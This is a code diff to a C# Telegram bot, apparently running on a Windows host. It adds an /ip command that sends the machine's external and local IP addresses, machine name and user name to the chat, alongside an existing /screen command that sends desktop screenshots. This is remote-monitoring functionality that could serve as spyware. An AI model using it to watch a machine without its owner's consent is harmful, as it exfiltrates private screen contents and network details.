@@ -9,6 +9,9 @@ using System.IO;
 using Telegram.Bot.Types;
 using System.Drawing;
 using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+using System.Text.RegularExpressions;
 
 namespace telegrambot
 {
@@ -33,7 +36,7 @@ namespace telegrambot
             bot.StartReceiving();
         }
 
-        private static void BotOnMessageReceived(object sender, MessageEventArgs e)
+        private async static void BotOnMessageReceived(object sender, MessageEventArgs e)
         {
             var message = e.Message;
 
@@ -42,7 +45,27 @@ namespace telegrambot
             {
                 case "/screen":
                     var fileToSend = new FileToSend("screenshot.jpeg", getScreenshot());
-                    bot.SendPhoto(message.Chat.Id, fileToSend, Environment.MachineName + " " + Environment.UserName);
+                    await bot.SendPhotoAsync(message.Chat.Id, fileToSend, Environment.MachineName + " " + Environment.UserName);
+                    break;
+                case "/ip":
+
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://checkip.dyndns.org/");
+                    request.Method = "GET";
+                    request.Accept = "text/html";
+                    DoWithResponse(request, (response) =>
+                    {
+
+                        var raw = new StreamReader(response.GetResponseStream()).ReadToEnd();
+                        Console.Write(raw);
+
+                        var localip = GetLocalIPAddress();
+
+                        Regex ip = new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b");
+                        MatchCollection result = ip.Matches(raw);
+                        var extarnalip = result[0];
+
+                        bot.SendTextMessageAsync(message.Chat.Id, Environment.MachineName + " " + Environment.UserName + "\r\n" + extarnalip + "\r\n" + localip);
+                    });
                     break;
                 default:
                     break;
@@ -68,6 +91,37 @@ namespace telegrambot
             memoryStream.Position = 0;
 
             return memoryStream;
+        }
+
+        private static void DoWithResponse(HttpWebRequest request, Action<HttpWebResponse> responseAction)
+        {
+            Action wrapperAction = () =>
+            {
+                request.BeginGetResponse(new AsyncCallback((iar) =>
+                {
+                    var response = (HttpWebResponse)((HttpWebRequest)iar.AsyncState).EndGetResponse(iar);
+                    responseAction(response);
+                }), request);
+            };
+            wrapperAction.BeginInvoke(new AsyncCallback((iar) =>
+            {
+                var action = (Action)iar.AsyncState;
+                action.EndInvoke(iar);
+            }), wrapperAction);
+        }
+
+        private static string GetLocalIPAddress()
+        {
+            string ips = String.Empty;
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    ips += ip.ToString() + "\r\n";
+                }
+            }
+            return ips;
         }
         #endregion
     }
